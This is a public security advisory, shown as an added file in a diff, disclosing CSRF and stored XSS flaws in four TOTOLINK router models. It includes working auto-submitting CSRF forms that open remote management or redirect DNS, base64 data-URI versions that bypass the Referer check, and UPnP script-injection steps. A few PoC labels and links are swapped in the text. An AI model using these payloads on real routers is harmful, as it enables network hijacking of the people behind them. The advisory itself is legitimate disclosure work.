@@ -1,0 +1,294 @@
+## Advisory Information
+
+Title: 4 TOTOLINK router models vulnerable to CSRF and XSS attacks
+Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
+Blog URL: http://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html
+Date published: 2015-07-16
+Vendors contacted: None
+Release mode: Released, 0day
+CVE: no current CVE
+
+
+
+## Product Description
+
+TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
+markets in South Korea.
+TOTOLINK produces routers routers, wifi access points and network
+devices. Their products are sold worldwide.
+
+
+
+## Vulnerability Summary
+
+TOTOLINK iPuppy, iPuppy3, N100RE and N200RE are wireless LAN routers.
+Their current firmwares with default configuration are
+vulnerable to CSRF-attacks and XSS attacks.
+Since, the anti-CSRF protection is based on a static HTTP referrer
+(RFC 1945), an attacker can take over
+most of the configuration and settings using anyone inside the LAN of
+the router. Owners are urged to
+contact TOTOLINK, and activate authentication on this product
+(disabled by default).
+
+It affects (firmware come from totolink.net and from totolink.cn):
+
+TOTOLINK iPuppy : firmware 1.2.1 (TOTOLINK iPuppy__V1.2.1.update)
+TOTOLINK iPuppy3 : firmware 1.0.2 (TOTOLINK iPuppy3_V1.0.2.update)
+TOTOLINK N100RE-V1 : firmware V1.1-B20140723-2-432-EN
+(TOTOLINK-N100RE-IP04216-RT5350-SPI-1M8M-V1.1-B20140723-2-432-EN.update)
+TOTOLINK N200RE : firmware V1.4-B20140724-2-457-EN
+(TOTOLINK-N200RE-IP04220-MT7620-SPI-1M8M-V1.4-B20140724-2-457-EN.update)
+
+
+
+## Details - CSRF
+
+The HTTP interface allows to edit the configuration. This interface is
+vulnerable to CSRF.
+
+Configuration and settings can be modified with CSRF attacks:
+Activate the remote control management
+Change the DNS configuration
+Update the firmware
+Change the Wifi Configuration
+Create TCP redirections to the LAN
+and more...
+
+
+Example of forms exploiting the CSRF:
+
+
+o Activating the remote control management on port 31337/tcp listening
+on the WAN interface.
+
+<html>
+<head>
+<script>
+function s() {
+document.f.submit();
+}
+</script>
+</head>
+<body onload="s()">
+<form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm">
+<input type="hidden" name="CMD" value="SYS">
+<input type="hidden" name="GO" value="firewallconf_accesslist.html">
+<input type="hidden" name="nowait" value="1">
+<input type="hidden" name="SET0" value="17367296=31337">
+<input type="hidden" name="SET1" value="17236224=1">
+</form>
+</body>
+</html>
+
+
+o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:
+
+<html>
+<head>
+<script>
+function s() {
+document.f.submit();
+}
+</script>
+</head>
+<body onload="s()">
+<form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm">
+<input type="hidden" name="CMD" value="WAN">
+<input type="hidden" name="GO" value="netconf_wansetup.html">
+<input type="hidden" name="SET0" value="50397440=2">
+<input type="hidden" name="SET1" value="50856960=64-E5-99-AA-AA-AA">
+<input type="hidden" name="SET2" value="235077888=1">
+<input type="hidden" name="SET3" value="235012865=0.2.0.7">
+<input type="hidden" name="SET4" value="235012866=1.2.0.1">
+<input type="hidden" name="SET5" value="51118336=0">
+<input type="hidden" name="SET6" value="51839232=1">
+<input type="hidden" name="SET7" value="51511552=1500">
+<input type="hidden" name="SET8" value="117834240=">
+<input type="hidden" name="SET9" value="117703168=">
+<input type="hidden" name="SET10" value="117637376=1492">
+<input type="hidden" name="SET11" value="51446016=1500">
+<input type="hidden" name="SET12" value="50463488=192.168.1.1">
+<input type="hidden" name="SET13" value="50529024=255.255.255.0">
+<input type="hidden" name="SET14" value="50594560=192.168.1.254">
+</form>
+</body>
+</html>
+
+
+The variable GO is an open redirect. Any URL like
+http://www.google.com/ for instance can be used.
+The variable GO is also vulnerable to XSS. It's out of scope in this advisory.
+
+
+To bypass the protection (which checks the refer), you can, for
+example, base64 the form and include
+it in the webpage.
+The refer will be empty and the CSRF will be accepted by the device:
+
+
+
+o activate_admin_wan_csrf_bypass.html:
+
+<html>
+<head>
+<meta http-equiv="Refresh"
+content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K">
+</head>
+<body>
+</body>
+</html>
+
+
+Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
+the remote management interface on port 31337/TCP.
+
+You can test it through
+http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-change_dns_csrf_bypass.html
+
+
+
+o change_dns_csrf_bypass.html:
+
+<html>
+<head>
+<meta http-equiv="Refresh"
+content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVu
+ IiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg==">
+</head>
+<body>
+</body>
+</html>
+
+
+Visiting activate_admin_wan_csrf_bypass.html in a remote location will
+change the DNS servers
+provided by the TOTOLINK device in the LAN.
+
+You can test it through
+http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-activate_admin_wan_csrf_bypass.html
+
+
+
+## Details - stored XSS and fun
+
+There is a stored XSS, which can be injected using UPNP from the LAN,
+without authentication:
+
+upnp> host send 0 WANConnectionDevice WANIPConnection AddPortMapping
+
+Required argument:
+Argument Name:  NewPortMappingDescription
+Data Type:      string
+Allowed Values: []
+Set NewPortMappingDescription value to: <script>alert("XSS");</script>
+
+Required argument:
+Argument Name:  NewLeaseDuration
+Data Type:      ui4
+Allowed Values: []
+Set NewLeaseDuration value to: 0
+
+Required argument:
+Argument Name:  NewInternalClient
+Data Type:      string
+Allowed Values: []
+Set NewInternalClient value to: <script>alert("XSS");</script>
+
+Required argument:
+Argument Name:  NewEnabled
+Data Type:      boolean
+Allowed Values: []
+Set NewEnabled value to: 1
+
+Required argument:
+Argument Name:  NewExternalPort
+Data Type:      ui2
+Allowed Values: []
+Set NewExternalPort value to: 80
+
+Required argument:
+Argument Name:  NewRemoteHost
+Data Type:      string
+Allowed Values: []
+Set NewRemoteHost value to: <script>alert("XSS");</script>
+
+Required argument:
+Argument Name:  NewProtocol
+Data Type:      string
+Allowed Values: ['TCP', 'UDP']
+Set NewProtocol value to: TCP
+
+Required argument:
+Argument Name:  NewInternalPort
+Data Type:      ui2
+Allowed Values: []
+Set NewInternalPort value to: 80
+
+
+upnp>
+
+
+The UPNP webpage in the administration area
+(http://192.168.0.1/popup_upnp_portmap.html) will show:
+
+[...]
+<tr>
+<td class=item_td>TCP</td>
+<td class=item_td>21331</td>
+<td class=item_td><script>alert("XSS")<script>alert("XSS");</script>:28777</td>
+<td class=item_td><script>alert("XSS");</script></td>
+</tr>
+[...]
+
+
+- From my research, there are some bits overflapping with others,
+resulting in showing funny ports
+and truncating input data. A remote DoS against the upnpd process
+seems to be easily done.
+
+Gaining Remote Code Execution by UPNP exploitation is again left as a
+exercise for the reader.
+
+
+
+## Vendor Response
+
+Due to "un-ethical code" found in TOTOLINK products (= backdoors found
+in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
+case.
+
+
+
+## Report Timeline
+
+* Apr 20, 2015: Vulnerabilities found by Pierre Kim in ipTIME devices.
+* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
+* Jun 25, 2015: Vulnerabilities found in TOTOLINK products by looking
+for similar ipTIME products.
+* Jul 16, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+
+
+## Greetings
+
+Big thanks to Alexandre Torres.
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
